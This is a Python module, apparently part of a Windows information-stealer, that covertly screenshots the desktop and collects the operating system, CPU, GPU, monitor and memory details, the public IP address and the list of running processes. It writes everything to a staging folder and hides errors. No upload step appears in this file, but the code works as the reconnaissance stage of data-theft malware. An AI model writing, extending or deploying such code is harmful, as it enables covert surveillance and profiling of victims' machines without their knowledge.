from os import mkdir
from multiprocessing import Process
from urllib.request import Request, urlopen

from mss import mss
from win32com.client import GetObject
from win32api import EnumDisplayMonitors, GetMonitorInfo

from ..utils.config import SystemConfig


class System(Process):

    def __init__(self, *args):
        Process.__init__(self)

        self.config = SystemConfig()

        for index, variable in enumerate(self.config.Variables):
            self.__dict__.update({variable: args[index]})

    def __create_folder(self):

        if any(self.statuses):
            mkdir(rf"{self.storage_path}\{self.folder}")

    def __create_screen(self):

        if self.statuses[0] is True:

            with mss() as screen:
                screen.shot(mon=-1, output=rf"{self.storage_path}\{self.folder}\Screenshot.png")

    def __get_system_info(self):

        if self.statuses[1] is True:

            win = GetObject("winmgmts:root\\cimv2")

            data = self.config.SystemData
            os_info = win.ExecQuery("Select * from Win32_OperatingSystem")[0]
            cpu_info = win.ExecQuery("Select * from Win32_Processor")[0].Name
            gpu_info = win.ExecQuery("Select * from Win32_VideoController")[0].Name
            monitors_info = ", ".join(f"{monitor['Device'][4:]} {monitor['Monitor'][2]}x{monitor['Monitor'][3]}" for monitor in [GetMonitorInfo(monitor[0]) for monitor in EnumDisplayMonitors()])

            try:
                net_info = urlopen(Request(method="GET", url=self.config.IPUrl)).read().decode("utf-8")
            except:
                net_info = "Error"

            with open(rf"{self.storage_path}\{self.folder}\Configuration.txt", "a", encoding="utf-8") as system:

                system.write(data.format(
                    self.config.User,
                    net_info,
                    os_info.Name.split('|')[0],
                    os_info.Version,
                    os_info.BuildNumber,
                    monitors_info,
                    cpu_info,
                    gpu_info,
                    round(float(os_info.TotalVisibleMemorySize) / 1048576)
                ))

    def __get_system_processes(self):

        if self.statuses[2] is True:

            results = [process.Properties_('Name').Value for process in GetObject('winmgmts:').InstancesOf('Win32_Process')]

            with open(rf"{self.storage_path}\{self.folder}\Processes.txt", "a", encoding="utf-8") as processes:
                processes.write("\n".join(result for result in list(set(results))))

    def run(self):

        try:

            self.__create_folder()
            self.__create_screen()
            self.__get_system_info()
            self.__get_system_processes()

        except Exception as e:
            if self.errors is True: print(f"[System]: {repr(e)}")
